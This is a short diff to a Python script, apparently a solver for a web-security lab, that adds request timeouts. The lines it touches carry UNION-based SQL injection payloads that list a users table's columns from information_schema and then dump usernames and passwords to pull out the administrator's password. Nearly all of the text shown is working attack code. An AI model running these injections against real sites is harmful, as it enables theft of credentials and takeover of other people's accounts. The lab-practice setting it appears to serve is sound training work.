@@ -16,7 +16,7 @@ def find_users_table(url, session):
 
 
 def get_column_names(url, session, users_table):
-    response = session.get(f"{url}/filter?category=' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = '{users_table}'--")
+    response = session.get(f"{url}/filter?category=' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = '{users_table}'--", timeout=10)
     soup = BeautifulSoup(response.text, 'html.parser')
     username_column = soup.find(string=re.compile('.*username.*'))
     password_column = soup.find(string=re.compile('.*password.*'))
@@ -24,7 +24,7 @@ def get_column_names(url, session, users_table):
 
 
 def get_admin_password(url, session, users_table, username_column, password_column):
-    response = session.get(f"{url}/filter?category=' UNION select {username_column}, {password_column} from {users_table}--")
+    response = session.get(f"{url}/filter?category=' UNION select {username_column}, {password_column} from {users_table}--", timeout=10)
     soup = BeautifulSoup(response.text, "html.parser")
     admin_password = soup.find(string="administrator").parent.findNext("td").contents[0]
     return admin_password
